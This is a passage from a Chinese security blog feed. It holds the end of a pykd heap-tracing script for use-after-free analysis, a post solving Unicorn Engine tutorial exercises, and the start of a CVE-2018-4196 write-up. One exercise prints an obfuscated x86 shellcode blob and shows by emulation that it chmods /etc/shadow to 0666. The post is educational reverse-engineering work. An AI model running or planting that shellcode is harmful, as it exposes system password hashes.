self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(<span class="built_in">int</span>(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        pykd.dprintln(self.out + <span class="built_in">hex</span>(pykd.reg(return_reg)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pykd.reg(<span class="string">&quot;rax&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    arch_bits = <span class="number">32</span></span><br><span class="line">    return_reg = <span class="string">&quot;eax&quot;</span></span><br><span class="line">    stack_pointer = <span class="string">&quot;esp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = get_address(&quot;ntdll!RtlReAllocateHeap&quot;)</span></span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"></span><br><span class="line">pykd.removeAllBp()</span><br><span class="line">bp_a1 = handle_allocate_heap()</span><br><span class="line">bp_a2 = handle_free_heap()</span><br><span class="line">bp_a3 = handle_realloc_heap()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;bps=%x&#x27;</span> %pykd.getNumberBreakpoints()</span><br></pre></td></tr></table></figure>

<p>我基于这些模版，写了自己做漏洞分析的时候使用的脚本。 思路也比较简单，就是找到目标对象的分配、释放点，下断点，自动记录分配/释放的内存地址、大小，然后做一个输出供自己分析用。</p>
<p>效果当然是很舒服啦  :)</p>
<h4 id="0x03-使用效果"><a href="#0x03-使用效果" class="headerlink" title="0x03 : 使用效果"></a>0x03 : 使用效果</h4><p>目标是大型软件时，windbg会有点卡，等一下就好了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; .load pykd</span><br><span class="line">&gt; !py -g path/to/script.py</span><br><span class="line">&gt; g</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257aaff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>vuln analysis</tag>
        <tag>uaf</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicorn Engine初体验</title>
    <url>/2018/01/15/Unicorn-Engine%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h4 id="0x00-关于unicorn-engine"><a href="#0x00-关于unicorn-engine" class="headerlink" title="0x00:关于unicorn engine"></a>0x00:关于unicorn engine</h4><p>Unicorn Engine是一个模拟器(emulator)，简单的来说就是可以模拟执行程序or片段的代码。对于逆向分析来说很有用，比如分析某个片段的代码的作用；对于漏洞挖掘选手来说，前一段时间的unicorn-afl着实亮眼，不过有带更深入的研究。</p>
<a id="more"></a>

<h4 id="0x01-关于本文"><a href="#0x01-关于本文" class="headerlink" title="0x01:关于本文"></a>0x01:关于本文</h4><p>很巧，今天玄武推送推了一篇<a href="http://eternal.red/2018/unicorn-engine-tutorial/">Unicorn Engine tutorial</a>，感觉写的很好，作者也很有趣，文章中还布置了<code>home work</code>，哈哈哈，上班的时候没时间做，下班回到家就看了看，模仿者第一个例子，和作者给出的hint把两个<code>home work</code>做了下。</p>
<h4 id="0x02-shellcode分析"><a href="#0x02-shellcode分析" class="headerlink" title="0x02: shellcode分析"></a>0x02: shellcode分析</h4><p>作者在这里给出了一段混淆过的shellcode，直接反汇编器查看的话，并不能直接分析出这段shellcode的作用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode &#x3D; &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ muheMacBookPro in &#x2F;tmp [22:38:29]</span><br><span class="line">$ python -c &#39;shellcode &#x3D; &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;;print shellcode&#39; &gt; sc.dump</span><br><span class="line"></span><br><span class="line"># muhe @ muheMacBookPro in &#x2F;tmp [22:38:37]</span><br><span class="line">$ file sc.dump</span><br><span class="line">sc.dump: data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用r2分析的话：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[0x00000000]&gt; pd</span><br><span class="line">            0x00000000      e8ffffffff     call 4</span><br><span class="line">            0x00000005      c05d6a05       rcr byte [rbp + 0x6a], 5</span><br><span class="line">            0x00000009      5b             pop rbx</span><br><span class="line">            0x0000000a      29dd           sub ebp, ebx</span><br><span class="line">            0x0000000c      83c54e         add ebp, 0x4e               ; <span class="string">&#x27;N&#x27;</span></span><br><span class="line">            0x0000000f      89e9           mov ecx, ebp</span><br><span class="line">            0x00000011      6a02           push 2                      ; 2</span><br><span class="line">            0x00000013      030c24         add ecx, dword [rsp]</span><br><span class="line">            0x00000016      5b             pop rbx</span><br><span class="line">            0x00000017      31d2           xor edx, edx</span><br><span class="line">            0x00000019      66ba1200       mov dx, 0x12                ; 18</span><br><span class="line">        ┌─&gt; 0x0000001d      8b39           mov edi, dword [rcx]</span><br><span class="line">        ⁝   0x0000001f      c1e710         shl edi, 0x10</span><br><span class="line">        ⁝   0x00000022      c1ef10         shr edi, 0x10</span><br><span class="line">        ⁝   0x00000025      81e9feffffff   sub ecx, 0xfffffffe</span><br><span class="line">        ⁝   0x0000002b      8b4500         mov eax, dword [rbp]</span><br><span class="line">        ⁝   0x0000002e      c1e010         shl eax, 0x10</span><br><span class="line">        ⁝   0x00000031      c1e810         shr eax, 0x10</span><br><span class="line">        ⁝   0x00000034      89c3           mov ebx, eax</span><br><span class="line">        ⁝   0x00000036      09fb           or ebx, edi</span><br><span class="line">        ⁝   0x00000038      21f8           and eax, edi</span><br><span class="line">        ⁝   0x0000003a      f7d0           not eax</span><br><span class="line">        ⁝   0x0000003c      21d8           and eax, ebx</span><br><span class="line">        ⁝   0x0000003e      66894500       mov word [rbp], ax</span><br><span class="line">        ⁝   0x00000042      83c502         add ebp, 2</span><br><span class="line">        ⁝   0x00000045      4a85d2         <span class="built_in">test</span> rdx, rdx</span><br><span class="line">        └─&lt; 0x00000048      0f85cfffffff   jne 0x1d</span><br><span class="line">            0x0000004e      ec             <span class="keyword">in</span> al, dx</span><br><span class="line">            0x0000004f      37             invalid</span><br><span class="line">        ┌─&lt; 0x00000050      755d           jne 0xaf</span><br><span class="line">       ┌──&lt; 0x00000052      7a05           jp 0x59</span><br><span class="line">       ││   0x00000054      28ed           sub ch, ch</span><br><span class="line">       ││   0x00000056      24ed           and al, 0xed</span><br><span class="line">       ││   0x00000058      24ed           and al, 0xed</span><br><span class="line">        │   0x0000005a      0b887feb5098   or ecx, dword [rax - 0x67af1481]</span><br><span class="line">        │   0x00000060      38f9           cmp cl, bh</span><br><span class="line">        │   0x00000062      5c             pop rsp</span><br><span class="line">        │   0x00000063      96             xchg eax, esi</span><br><span class="line">        │   0x00000064      2b9670fec6ff   sub edx, dword [rsi - 0x390190]</span><br><span class="line">        │   0x0000006a      c6             invalid</span><br><span class="line">        │   0x0000006b      ff9f321f581e   lcall [rdi + 0x1e581f32]</span><br><span class="line">        │   0x00000071      00d3           add bl, dl</span><br><span class="line">        │   0x00000073      800aff         or byte [rdx], 0xff</span><br><span class="line">        │   0x00000076      ff             invalid</span><br><span class="line">        │   0x00000077      ff             invalid</span><br><span class="line">        │   0x00000078      ff             invalid</span><br><span class="line">        │   0x00000079      ff             invalid</span><br><span class="line">        │   0x0000007a      ff             invalid</span><br><span class="line">        │   0x0000007b      ff             invalid</span><br></pre></td></tr></table></figure>
<p>事实是啥都看不出来，但是作者说：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Note that the architecture is x86-32 now. List of syscalls numbers can be found here.</span><br></pre></td></tr></table></figure>

<p>32位的，而且是调用了系统调用搞事情的。<br>那就可以模仿文中的例子，模拟执行这段代码，然后对系统调用打hook，把参数print出来，然后再跳过去。</p>
<p>根据资料，调用号放在eax寄存器，参数的顺序是：ebx,ecx,edx,esi,edi。<br>下面就是hook了<code>int 80h</code>指令，然后搞事情。</p>
<p>我的hook函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span></span><br><span class="line">    op_code = mu.mem_read(address, size)</span><br><span class="line">    <span class="keyword">if</span> op_code == <span class="string">&quot;\xcd\x80&quot;</span>:</span><br><span class="line">        call_number = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">        param1 = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        param2 = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        param3 = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        param4 = mu.reg_read(UC_X86_REG_ESI)</span><br><span class="line">        param5 = mu.reg_read(UC_X86_REG_EDI)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[*]Result as followed:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tCall number: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(call_number))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tParam1     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param1))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tParam2     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param2))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tParam3     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param3))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tParam4     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param4))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;\tParam5     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param5))</span><br><span class="line"></span><br><span class="line">        mu.reg_write(UC_X86_REG_EIP, address + size)</span><br></pre></td></tr></table></figure>

<p> 运行结果：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> $ python task1.py</span><br><span class="line">[*]Result as followed:</span><br><span class="line">	Call number: 15</span><br><span class="line">	Param1     : 4194392</span><br><span class="line">	Param2     : 438</span><br><span class="line">	Param3     : 0</span><br><span class="line">	Param4     : 0</span><br><span class="line">	Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">	Call number: 1</span><br><span class="line">	Param1     : 4194392</span><br><span class="line">	Param2     : 438</span><br><span class="line">	Param3     : 0</span><br><span class="line">	Param4     : 0</span><br><span class="line">	Param5     : 32979</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第四、第五个参数应该没用到，第一次调用时15号调用，第二次是1号调用。查了一下，15号是chmod，1号是exit。<br>chmod的参数应该是文件名，权限。exit的参数的话，就是4194392。</p>
<p>就是想办法确定chmod操作了什么文件，4194392应该是一个指针。修改hook函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;\tCall number: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(call_number))</span><br><span class="line">        <span class="keyword">if</span> call_number == <span class="number">15</span>:</span><br><span class="line">            file = mu.mem_read(param1, <span class="number">32</span>).split(<span class="string">&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;\t[*]File is &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(file))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;\tParam1     : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(param1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*]Result as followed:</span><br><span class="line">	Call number: 15</span><br><span class="line">	[*]File is /etc/shadow</span><br><span class="line">	Param2     : 438</span><br><span class="line">	Param3     : 0</span><br><span class="line">	Param4     : 0</span><br><span class="line">	Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">	Call number: 1</span><br><span class="line">	Param1     : 4194392</span><br><span class="line">	Param2     : 438</span><br><span class="line">	Param3     : 0</span><br><span class="line">	Param4     : 0</span><br><span class="line">	Param5     : 32979</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>chmod的第二个参数其实就是0666:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; oct(438)</span><br><span class="line">&#39;0666&#39;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>到此，分析完毕。</p>
<h4 id="0x03-修改函数的返回值"><a href="#0x03-修改函数的返回值" class="headerlink" title="0x03: 修改函数的返回值"></a>0x03: 修改函数的返回值</h4><p>修改下面程序的逻辑，使得返回值是1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get length</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr = a;</span><br><span class="line">    <span class="keyword">while</span>(*ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//comparestrings</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]!=b[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((stdcall))</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">super_function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">&quot;batman&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    super_function(<span class="number">1</span>, <span class="string">&quot;spiderman&quot;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>这个也好做，直接调用super_function,然后根据栈的结构，直接把参数改了，因为是x86，c语言的调用约定是从右到左依次压栈，所以字符串spiderman的指针是第一个压栈的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">saved ebp</span><br><span class="line">ret addr</span><br><span class="line">1</span><br><span class="line">ptr ---&gt; &quot;spiderman\0&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>大概就是上面这样。</p>
<p>这部分比较容易，自己编译一个这个程序，然后找一下super_function函数的开头和结尾。</p>
<p>这个bin文件在mac上编译出来，地址啥的不一样，写脚本的时候要注意，bin文件映射地址最好是ida里分析的文件起始地址，这样的话，后面调用super func的时候，地址啥的可以直接用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>, num)</span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x00000000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x40000000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">&quot;./function&quot;</span>))</span><br><span class="line">r_esp = STACK_ADDR + (STACK_SIZE/<span class="number">2</span>)     <span class="comment">#ESP points to this address at function call</span></span><br><span class="line"></span><br><span class="line">STRING_ADDR = <span class="number">0x40000000</span></span><br><span class="line">mu.mem_write(STRING_ADDR, <span class="string">&quot;batman\x00&quot;</span>) <span class="comment">#write &quot;batman&quot; somewhere. We have choosen an address 0x0 which belongs to the stack.</span></span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, r_esp)     <span class="comment">#set ESP</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">4</span>, p32(<span class="number">5</span>))           <span class="comment">#set the first argument. It is integer 5</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">8</span>, p32(STRING_ADDR)) <span class="comment">#set the second argument. This is a pointer to the string &quot;batman&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x0000057B</span>, <span class="number">0x000005B1</span>)      <span class="comment">#start emulation from the beginning of super_function, end at RET instruction</span></span><br><span class="line">return_value = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;The returned value is: %d&quot;</span> % return_value</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:19:10]</span></span><br><span class="line">$ python task2.py</span><br><span class="line">The returned value is: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x04-arm32的一个cm"><a href="#0x04-arm32的一个cm" class="headerlink" title="0x04: arm32的一个cm"></a>0x04: arm32的一个cm</h4><p>类似于作者原文的第一个demo，就是那个ctf题目，只不过这次arch换成了arm32，注意大小端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v3 = ccc(<span class="number">0x2710</span>u, (<span class="keyword">int</span>)argv, (<span class="keyword">int</span>)envp);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_745A4, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在没有arm环境的情况下，使用unicorn来得出这个函数结算结果-。- 虽然我有arm环境 2333333</p>
<p>搜了一下arm传参的方式：</p>
<ol>
<li><p>输入参数通过r0-r3传递，多余的放入堆栈中；返回值放入r0，不够的话放入{r0,r1}或者{r0,r1,r2,r3}，比如：<br>int foo(int a, int b, int c, int d), 输入：r0 = a, r1 = b, r2 = c, r3 = d，返回：r0 = 类型为int的retvalue<br>int *foo(char a, double b, int c, char d), 输入：r0 = a, r1用于对齐(double 要求8字节对齐), b = {r2, r3}，c放在堆栈的sp[0]位置，d放在堆栈的sp[4]位置，这里的sp是指进入函数时的sp；返回：r0 = 类型为int *的retvalue</p>
</li>
<li><p>注意如果返回值是结构体，情况有些特殊：<br>struct client foo(int a, char b, float c), 输入：r0 = 一个strcut client *变量，由调用者给出, r1 = a, r2 = b, r3 = c；返回：strcut client *变量，和调用者给的一样</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>, data)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>, num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x10000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x300000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">&quot;./task4_arm&quot;</span>))</span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">instructions_skip_list = []</span><br><span class="line"></span><br><span class="line">CCC_START = <span class="number">0x000104D0</span></span><br><span class="line">CCC_END   = <span class="number">0x00010580</span></span><br><span class="line"></span><br><span class="line">stack = []                                          <span class="comment"># Stack for storing the arguments</span></span><br><span class="line">d = &#123;&#125;                                              <span class="comment"># Dictionary that holds return values for given function arguments</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> address == CCC_START:                        <span class="comment"># Are we at the beginning of ccc function?</span></span><br><span class="line">        arg0 = mu.reg_read(UC_ARM_REG_R0)           <span class="comment"># Read the first argument. it is passed by R0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> arg0 <span class="keyword">in</span> d:                               <span class="comment"># Check whether return value for this function is already saved.</span></span><br><span class="line">            ret = d[arg0]</span><br><span class="line">            mu.reg_write(UC_ARM_REG_R0, ret)        <span class="comment"># Set return value in R0</span></span><br><span class="line">            mu.reg_write(UC_ARM_REG_PC, <span class="number">0x105BC</span>)    <span class="comment"># Set PC to point at &quot;BX LR&quot; instruction. We want to return from fibonacci function</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append(arg0)                      <span class="comment"># If return value is not saved for this argument, add it to stack.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> address == CCC_END:</span><br><span class="line">        arg0 = stack.pop()                          <span class="comment"># We know arguments when exiting the function</span></span><br><span class="line"></span><br><span class="line">        ret = mu.reg_read(UC_ARM_REG_R0)            <span class="comment"># Read the return value (R0)</span></span><br><span class="line">        d[arg0] = ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x00010584</span>, <span class="number">0x000105A8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ret:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(mu.reg_read(UC_ARM_REG_R1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:34:12]</span></span><br><span class="line">$ python task4.py</span><br><span class="line">ret:2635833876</span><br></pre></td></tr></table></figure>


<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05: 参考"></a>0x05: 参考</h4><p><a href="http://eternal.red/2018/unicorn-engine-tutorial/">Unicorn Engine tutorial</a></p>
<p><a href="http://blog.csdn.net/ayu_ag/article/details/50734282">arm平台函数传递参数，反汇编实例分析</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>study</tag>
        <tag>unicorn engine</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Uninitialised Objective-C Pointer Vulnerability Analysis (CVE-2018-4196)</title>
    <url>/2019/09/09/Uninitialised-Objective-C-Pointer-Vulnerability-Analysis-CVE-2018-4196/</url>
    <content><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p>MWR Lab在pwn2own2018用来macOS上一整套利用的sbx部分漏洞分析，这个漏洞发生在<code>com.apple.dock.server</code>服务，是一个栈指针未初始化。</p>
<a id="more"></a>


